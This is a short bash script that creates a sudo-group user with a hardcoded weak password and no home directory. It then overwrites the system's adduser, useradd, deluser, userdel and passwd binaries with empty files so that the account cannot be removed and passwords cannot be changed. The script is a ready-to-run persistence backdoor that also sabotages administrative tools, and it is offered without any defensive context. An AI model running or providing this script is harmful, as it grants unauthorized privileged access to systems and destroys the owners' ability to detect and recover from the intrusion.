#!/bin/bash
useradd -M -g sudo -p $(openssl passwd -crypt password) username
# -M no home dir
# -p password
# -g main group

#Stop deleting users/ change password
echo '' > /usr/sbin/adduser
echo '' > /usr/sbin/useradd
echo '' > /usr/sbin/deluser
echo '' > /usr/sbin/userdel
echo '' > /usr/bin/passwd

